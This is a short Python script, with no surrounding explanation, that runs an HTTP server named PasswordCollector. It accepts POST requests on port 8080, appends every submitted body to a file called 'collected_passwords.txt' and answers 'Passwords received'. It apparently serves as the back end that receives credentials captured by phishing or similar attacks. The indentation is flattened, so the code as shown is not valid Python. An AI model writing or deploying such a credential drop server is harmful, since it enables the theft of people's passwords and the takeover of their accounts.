from http.server import BaseHTTPRequestHandler, HTTPServer

class PasswordCollector(BaseHTTPRequestHandler):
 def _set_headers(self):
 self.send_response(200)
 self.send_header('Content-type', 'text/html')
 self.end_headers()

 def do_POST(self):
 content_length = int(self.headers['Content-Length'])
 post_data = self.rfile.read(content_length)
 with open('collected_passwords.txt', 'a') as f:
 f.write(post_data.decode('utf-8') + '\n')
 self._set_headers()
 self.wfile.write(b'Passwords received')

def run(server_class=HTTPServer, handler_class=PasswordCollector, port=8080):
 server_address = ('', port)
 httpd = server_class(server_address, handler_class)
 print(f'Starting httpd server on port {port}')
 httpd.serve_forever()

if __name__ == "__main__":
 run()

